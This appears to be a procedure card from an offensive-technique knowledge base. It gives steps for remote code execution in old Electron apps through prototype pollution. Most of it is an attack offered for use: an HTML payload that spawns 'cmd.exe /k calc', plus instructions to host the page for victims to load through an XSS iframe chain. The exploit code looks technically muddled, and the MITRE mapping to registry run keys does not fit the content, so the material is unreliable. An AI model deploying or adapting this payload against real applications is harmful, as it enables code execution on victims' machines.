---
id: proc-uuid-005
tags:
  - rce
  - prototype-pollution
  - electron-exploit
type: procedure
tools: []
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/spawn-cmd-calc]]'
verified: false
platforms:
  - Windows
  - Electron
submitted: true
created_at: '2023-10-01T12:00:00Z'
techniques:
  - '[[JavaScript]]'
  - '[[Registry Run Keys - Startup Folder]]'
updated_at: '2025-12-13T23:55:20.589Z'
skill_level: advanced
impact_level: high
detection_risk: high
sub_techniques: []
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
  - '[[Registry Run Keys - Startup Folder]]'
---
# Host RCE via Prototype Pollution

## Summary

This procedure hosts an HTML page with JavaScript that pollutes the Object prototype in Electron to access internal bindings, enabling process spawning for RCE on the victim's desktop app.

## Description

In older Electron versions (v1.0.2), context isolation is weak; polluting Object.prototype.toString.call overrides it to access process.binding('process').spawn, executing system commands. The page loads via iframe chain from XSS. Outcome: Arbitrary command execution, e.g., launching calc.exe.

## Requirements

1. Control over hosting domain
2. Knowledge of Electron internals
3. Target using vulnerable app version

## Defense

Defensive measures and detection strategies:

- Update Electron to versions with context isolation
- Disable nodeIntegration and enable sandbox
- Monitor for prototype mutations in app logs

## Objectives

1. Achieve RCE via JS in Electron
2. Spawn system processes
3. Demonstrate impact like app launch

## Instructions

### Step 1: Create RCE.html

**Context**: Embed the pollution script.

Write:
```html
<!DOCTYPE html>
<html><body><script>
Object.prototype.toString.call = process.binding('process').spawn;
Object.prototype.toString.call('cmd.exe /k calc');
</script></body></html>
```
Use [[commands/spawn-cmd-calc]] for the spawn argument.

### Step 2: Host and Test

**Context**: Deploy for victim load.

Upload to https://rce-domain.com/RCE.html. Test in similar Electron env if possible.

**Expected Output**: Command spawns on load.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]] Execution

### Techniques

- [[JavaScript]] JavaScript
- [[Registry Run Keys - Startup Folder]] Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder

### Sub-Techniques


## Commands Used

- [[commands/spawn-cmd-calc]]

## Tools Used


## Tags

- rce
- prototype-pollution
- electron-exploit
